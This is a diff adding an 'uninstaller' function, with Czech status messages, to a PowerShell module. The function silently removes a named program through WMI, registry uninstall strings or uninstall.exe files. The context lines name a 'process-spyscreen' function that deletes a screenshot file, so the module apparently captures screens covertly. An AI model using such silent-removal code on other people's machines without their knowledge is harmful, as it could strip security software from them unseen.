@@ -367,5 +367,75 @@ Remove-Item -Path $screenshotPath -Force -ErrorAction SilentlyContinue
 Export-ModuleMember -Function process-spyscreen 
 Set-Alias -Name process-spyscreen -Value process-spyscreen
 
-
+function uninstaller {
+    [CmdletBinding()]
+    param (
+        [string]$Value
+    )
+    $programName = $Value
+    $programFound = $false
+    $program = Get-WmiObject -Class Win32_Product | Where-Object { $_.Name -eq $programName }
+    if ($program) {
+        $program.PSBase.InvokeMethod("Uninstall", $null) | Out-Null
+        Write-Output "Program $programName byl úspěšně odinstalován."
+        $programFound = $true
+    }
+    function Uninstall-Program {
+        param (
+            [string]$folderPath
+        )
+        $uninstallPath = Join-Path -Path $folderPath -ChildPath "uninstall.exe"
+        if (Test-Path $uninstallPath) {
+            Start-Process -FilePath $uninstallPath -ArgumentList "/S" -NoNewWindow -Wait
+            Write-Output "Program $programName byl úspěšně odinstalován z $folderPath."
+            return $true
+        }
+        return $false
+    }
+    $folders = @(
+        "C:\Program Files\$programName",
+        "C:\Program Files\*\$programName",
+        "C:\Program Files\*\*\$programName",
+        "C:\Program Files (x86)\$programName",
+        "C:\Program Files (x86)\*\$programName",
+        "C:\Program Files (x86)\*\*\$programName",
+        "C:\ProgramData\$programName",
+        "C:\ProgramData\*\$programName",
+        "C:\ProgramData\*\*\$programName",
+        "$env:userprofile\AppData\Local\Programs\$programName",
+        "$env:userprofile\AppData\Local\Programs\*\$programName",
+        "$env:userprofile\AppData\Local\Programs\*\*\$programName"
+    )
+    $registryPaths = @(
+        'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*',
+        'HKLM:\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*',
+        'HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*'
+    )
+    foreach ($registryPath in $registryPaths) {
+        $registryEntries = Get-ItemProperty -Path $registryPath | Where-Object { $_.DisplayName -eq $programName }
+        foreach ($entry in $registryEntries) {
+            $uninstallString = $entry.UninstallString
+            if ($uninstallString) {
+                Start-Process -FilePath $uninstallString -ArgumentList "/S" -NoNewWindow -Wait
+                Write-Output "Program $programName byl úspěšně odinstalován pomocí registry."
+                $programFound = $true
+                break
+            }
+        }
+        if ($programFound) { break }
+    }
+    if (-not $programFound) {
+        foreach ($folder in $folders) {
+            if (Uninstall-Program -folderPath $folder) {
+                $programFound = $true
+                break
+            }
+        }
+    }
+    if (-not $programFound) {
+        Write-Output "Program $programName nebyl nalezen v zadaných složkách ani v registrech."
+    }
+}
+Export-ModuleMember -Function uninstaller
+Set-Alias -Name uninstaller -Value uninstaller -Description "Run code for uninstaller"
 
